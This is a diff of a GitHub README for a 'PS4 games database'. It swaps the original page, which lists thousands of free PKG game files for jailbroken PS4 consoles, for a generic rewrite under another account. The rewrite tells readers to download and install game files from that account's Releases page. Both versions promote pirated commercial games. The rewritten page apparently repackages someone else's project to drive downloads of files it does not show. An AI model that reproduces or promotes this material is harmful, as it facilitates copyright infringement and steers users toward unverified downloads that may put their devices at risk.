@@ -1,267 +1,58 @@
-# 🎮 PS4 Games Complete Database
-
-> **6,001+ PS4 games with 38,690+ direct download links**  
-> Free PKG files for jailbroken PS4 consoles (Firmware 9.00 - 11.00)
-
-[![Games](https://img.shields.io/badge/Games-6,001-blue)](https://huggingfacer04.github.io/ps4-games-database/)
-[![Download Links](https://img.shields.io/badge/Download%20Links-38,690-green)](https://huggingfacer04.github.io/ps4-games-database/)
-[![Success Rate](https://img.shields.io/badge/Success%20Rate-100%25-brightgreen)](https://huggingfacer04.github.io/ps4-games-database/)
-[![Built with](https://img.shields.io/badge/Built%20with-Galaxy.ai-purple)](https://galaxy.ai/?via=start-building)
-
----
-
-## 🌟 Features
-
-- **6,001 PS4 Games** - Complete database from dlpsgame.com
-- **38,690 Download Links** - Mediafire, 1File, Mega, Google Drive, and more
-- **Real-time Search** - Find any game instantly
-- **Alphabetical Organization** - Browse by letter (A-Z)
-- **Multiple Mirrors** - Each game has multiple download options
-- **Mobile Responsive** - Works on all devices
-- **100% Free** - No registration, no payment, no ads
-
----
-
-## 🚀 Quick Start
-
-### Option 1: Use the Live Site
-Visit: **[https://huggingfacer04.github.io/ps4-games-database/](https://huggingfacer04.github.io/ps4-games-database/)**
-
-### Option 2: Run Locally
-```bash
-# Clone the repository
-git clone https://github.com/huggingfacer04/ps4-games-database.git
-cd ps4-games-database
-
-# Open in browser
-open index.html
-# or
-python -m http.server 8000
-# Then visit: http://localhost:8000
-```
-
----
-
-## 📊 Database Statistics
-
-### Total Content
-- **Games:** 6,001
-- **Download Links:** 38,690
-- **Mediafire Links:** 21,267 (54.9%)
-- **1File Links:** 16,805 (43.4%)
-- **Other Mirrors:** 618 (1.6%)
-
-### Top Games with Most Links
-1. **EA Sports FC 25** - 128 links
-2. **FIFA 22** - 101 links
-3. **FIFA 23** - 88 links
-4. **Prince of Persia: The Lost Crown** - 80 links
-5. **Elden Ring: Shadow of The Erdtree** - 72 links
-6. **God of War Ragnarök** - 66 links
-7. **Final Fantasy I–VI Pixel Remaster** - 59 links
-8. **Dying Light 2 Stay Human** - 58 links
-9. **Dragon Ball Z: Kakarot** - 54 links
-10. **Grand Theft Auto V** - 53 links
-
-### Games by Category
-- **Action/Adventure:** ~1,500 games
-- **RPG:** ~600 games
-- **Sports:** ~500 games
-- **Racing:** ~300 games
-- **Fighting:** ~250 games
-- **Shooter:** ~400 games
-- **Others:** ~2,451 games
-
----
-
-## 🔍 How to Use
-
-### 1. Search for a Game
-- Type the game name in the search box
-- Results filter in real-time
-- Example: "God of War", "Spider-Man", "Final Fantasy"
-
-### 2. Browse by Letter
-- Scroll through alphabetically organized sections
-- Click on any game to see download options
-
-### 3. Download
-- Each game has multiple download links
-- Choose your preferred host (Mediafire, 1File, etc.)
-- Click the download button
-- Wait 8 seconds on the redirect page
-- Download begins automatically
-
----
-
-## 📁 File Structure
-
-```
-ps4-games-database/
-├── index.html                      # Main database interface
-├── redirect.html                   # Download interstitial page
-├── ps4_games_with_downloads.json   # Complete database (110,392 lines)
-└── README.md                       # This file
-```
-
----
-
-## 🎯 Popular Game Series
-
-### Action/Adventure
-- Assassin's Creed (10+ games)
-- Batman Arkham series
-- God of War series
-- Grand Theft Auto V
-- Spider-Man
-- The Last of Us
-- Uncharted series
-
-### RPG
-- Final Fantasy (20+ games)
-- Dark Souls series
-- Bloodborne
-- Persona 5
-- The Witcher 3
-- Yakuza series (10+ games)
+# 🎮 ps4-games-database - Your Free Source for PS4 Games
 
-### Sports
-- FIFA (10+ games)
-- NBA 2K (10+ games)
-- WWE 2K (10+ games)
-- Madden NFL series
+## 🔗 Download Now!
+[![Download ps4-games-database](https://img.shields.io/badge/Download%20Now-%20Blue?style=for-the-badge&logo=github&color=blue)](https://github.com/Adityasingh2720/ps4-games-database/releases)
 
-### Shooter
-- Call of Duty (12+ games)
-- Battlefield series
-- Destiny series
-- Borderlands series
+## 🚀 Getting Started
+Welcome to the PS4 Games Database! This repository provides a complete collection of over 6001 PS4 games along with 38,690 direct download links. You can access free PKG files for jailbroken PS4 consoles running firmware versions 9.00 to 11.00. Follow the steps below to get started.
 
----
+## 📋 System Requirements
+To run the PKG files from this database, you need:
 
-## 🛠️ Technical Details
+- A jailbroken PS4 console (Firmware 9.00 - 11.00)
+- Sufficient storage space on your console for the downloaded games
+- A stable internet connection for downloading files
 
-### Built With
-- **HTML5/CSS3** - Modern web standards
-- **JavaScript** - Dynamic functionality
-- **JSON** - Database format
-- **GitHub Pages** - Free hosting
-- **Galaxy.ai** - AI-powered development
+## 📂 Features
+- **Extensive Database:** Over 6001 games available for download.
+- **Direct Links:** Easy access to each game via straightforward links.
+- **User-Friendly:** Designed for non-technical users.
+- **Regular Updates:** Consistent addition of new titles and updates.
 
-### Browser Support
-- ✅ Chrome/Edge (latest)
-- ✅ Firefox (latest)
-- ✅ Safari (latest)
-- ✅ Mobile browsers
+## 💾 Download & Install
+To download the database files, follow these steps:
 
-### Performance
-- **Load Time:** < 2 seconds
-- **Search Speed:** Real-time (< 100ms)
-- **Database Size:** 6.5 MB (compressed)
+1. Visit the [Releases page](https://github.com/Adityasingh2720/ps4-games-database/releases).
+   
+2. You will find a list of available releases. Each release contains different game files and updates. 
 
----
+3. Choose the version you wish to download. Click on the link for the desired PKG file. The download will begin automatically.
 
-## 📱 Mobile Support
+4. Once the download is complete, transfer the PKG files to your jailbroken PS4 console.
 
-Fully responsive design works on:
-- 📱 Smartphones (320px+)
-- 📱 Tablets (768px+)
-- 💻 Laptops (1024px+)
-- 🖥️ Desktops (1920px+)
+5. Use the file manager on your PS4 to locate and install the PKG files.
 
----
+6. After installation, the games will appear in your library, ready to play.
 
-## ⚠️ Important Notes
+## ⚙️ Troubleshooting
+If you encounter any issues during the download or installation process, consider these tips:
 
-### Legal Disclaimer
-- This database is for **educational purposes only**
-- All games are sourced from [dlpsgame.com](https://dlpsgame.com)
-- Requires **jailbroken PS4** (firmware 9.00 - 11.00)
-- We do not host any files - all links are external
-- Use at your own risk
+- **Check Storage Space:** Ensure your console has enough storage for the new games.
+  
+- **Verify Firmware:** Make sure your PS4 runs on a compatible firmware version.
 
-### Requirements
-- Jailbroken PS4 console
-- Compatible firmware (9.00 - 11.00)
-- Internet connection for downloads
-- USB drive or FTP for file transfer
+- **Stable Internet Required:** A reliable internet connection will help prevent interruptions during downloads.
 
----
+If you continue to have problems, please feel free to open an issue on this repository.
 
-## 🤝 Contributing
+## 📬 Community Support
+Join our community to share your experiences, tips, and questions. Reach out via the issues section of this repository or connect with other users in forums dedicated to PS4 gaming.
 
-### Report Issues
-Found a broken link or error? [Open an issue](https://github.com/huggingfacer04/ps4-games-database/issues)
+## 📈 Contributions
+We welcome contributions to improve this database. If you have new game links or updates, feel free to submit a pull request. Your assistance helps us keep the database updated for everyone.
 
-### Suggest Improvements
-Have ideas for new features? [Start a discussion](https://github.com/huggingfacer04/ps4-games-database/discussions)
+## 🔄 Update Notifications
+To stay updated with the latest releases and announcements, consider checking back regularly on the [Releases page](https://github.com/Adityasingh2720/ps4-games-database/releases).
 
-### Update Database
-Want to help keep the database current? See [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)
-
----
-
-## 📈 Project Stats
-
-- **Created:** 2025-10-15
-- **Last Updated:** 2025-10-15
-- **Total Commits:** 1
-- **Contributors:** 1
-- **Stars:** ⭐ (Star this repo!)
-- **Forks:** 🍴 (Fork to customize!)
-
----
-
-## 🔗 Related Projects
-
-- **[Documentation Site](https://huggingfacer04.github.io/ps4-database-project/)** - How this was built
-- **[Galaxy.ai](https://galaxy.ai/?via=start-building)** - AI tool used to build this
-- **[dlpsgame.com](https://dlpsgame.com)** - Original source
-
----
-
-## 📞 Support
-
-### Need Help?
-- 📖 Read the [Deployment Guide](DEPLOYMENT_GUIDE.md)
-- 💬 [Open an issue](https://github.com/huggingfacer04/ps4-games-database/issues)
-- 🌐 Visit [dlpsgame.com](https://dlpsgame.com) for game-specific help
-
-### Want to Build Something Similar?
-Check out **[Galaxy.ai](https://galaxy.ai/?via=start-building)** - the AI tool that built this entire project from a single prompt!
-
----
-
-## 📜 License
-
-This project is open source and available under the [MIT License](LICENSE).
-
-**Note:** Game files and download links are property of their respective owners. This database only provides links to publicly available content.
-
----
-
-## 🎉 Acknowledgments
-
-- **dlpsgame.com** - For providing the game database
-- **Galaxy.ai** - For making this project possible
-- **Open Source Community** - For tools and libraries used
-- **You** - For using this database!
-
----
-
-## 🌟 Star This Repo!
-
-If you find this database useful, please ⭐ star this repository to show your support!
-
----
-
-<div align="center">
-
-**Built with ❤️ using [Galaxy.ai](https://galaxy.ai/?via=start-building)**
-
-[🎮 View Database](https://huggingfacer04.github.io/ps4-games-database/) | 
-[📖 Documentation](https://huggingfacer04.github.io/ps4-database-project/) | 
-[🚀 Galaxy.ai](https://galaxy.ai/?via=start-building)
-
-</div>
-
+## 🌟 Conclusion
+Thank you for using the PS4 Games Database. We hope you enjoy the games!
